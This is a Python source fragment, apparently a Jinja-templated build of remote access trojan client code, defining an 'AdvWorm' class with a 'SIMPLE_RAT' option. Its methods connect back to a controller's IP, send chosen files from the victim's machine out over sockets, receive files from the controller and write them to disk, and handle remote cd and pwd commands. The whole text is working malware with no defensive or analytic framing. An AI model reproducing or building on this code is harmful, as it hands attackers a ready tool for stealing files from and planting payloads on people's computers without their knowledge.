



class AdvWorm(BasicWorm):
    def __init__(self):
        super().__init__()
        self.too_grab = None
    
    def make_extra_socket(self, port):
        port = int(float(port))
        print("PORT: ", port)
        try:
            _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            _socket.connect((self._ip, port))
            return _socket
        except OSError as e:
            self.send_msg(f"ERROR: build socket error: {e}")
            return None


    def grab_file(self, name):
        fpath = os.path.join(os.getcwd(), name)
        if not os.path.exists(fpath):
            self.send_msg("ERROR: file doesnt exist")
            return False
        flen = str(os.stat(fpath).st_size)
        self.send_sys_msg(f"grab {name} {flen}")
        self.too_grab = str(fpath)
        return True
    
    def _download(self, port):
        _socket = self.make_extra_socket(port)
        if not _socket:
            self.send_msg("ERROR: Send file abort !!")
            return False
        try:
            with open(self.too_grab, "rb") as f:
                _socket.sendfile(f, 0)
        except:
            self.send_msg("ERROR: open file error")
            return False
        _socket.close()
        self.send_msg("Item send successfull")
        self.too_grab = None
    
    def download(self, port):
        download = Thread(target=self._download, args=(port, ), daemon=True)
        sleep(1)
        download.start()
    
    def _upload_item(self, name, flen, port):
        sleep(1)
        xsocket = self.make_extra_socket(port)
        if not xsocket:
            print("ERROR XSOCKET")
            return False
        flen = int(float(flen))
        item = b""
        while len(item) < flen:
            buff = xsocket.recv(flen - len(item))
            if not buff:
                return None
            item += buff
        
        try:
            xsocket.shutdown(socket.SHUT_RDWR)
            xsocket.close()
        except:
            pass
        self.save_item(name, item)
    
    def save_item(self, name, data):
        try:
            with open(os.path.join(os.getcwd(), name), "wb") as f:
                f.write(data)
            self.send_msg(f"Save item < {name} > successfull")
        except OSError as e:
            self.send_msg(f"ERROR save item: {name}")
    
    def upload_item(self, name, flen, port):
        up = Thread(target=self._upload_item, args=(name, flen, port), daemon=True)
        up.start()
        print("START UPPPPP")
    
    {%if SIMPLE_RAT%}
    def get_cwd(self):
        return "\n" + "*" * 80 + f"\n\n{os.getcwd()}\n"
    
    def change_dir(self, new):
        try:
            os.chdir(new)
            out = "Change Dir Successfull" + self.get_cwd()
        except Exception as e:
            out = f"ERROR: {e}"
        
        return out
    {%endif%}

    def _exec_command(self, command):
        {%if SIMPLE_RAT%}
        if command == "pwd":
            self.send_msg(self.get_cwd())
        elif command.startswith("cd"):
            self.send_msg(self.change_dir(command[3:]))
        {%endif%}
        cmd = self.unpack_command(command)
        if cmd[0] == "grab":
            self.grab_file(cmd[1])
        elif cmd[0] == "upload":
            self.upload_item(cmd[1], cmd[2], cmd[3])
        
        else:
            self.exec_command(command)
    
    def exec_command(self, command):
        pass
    
    def _exec_sys_command(self, command):
        cmd = self.unpack_headers(command)
        if cmd[0] == "sock_addr":
            self.download(cmd[1])
        else:
            self.exec_sys_command(cmd)

    def exec_sys_command(self, command):
        pass



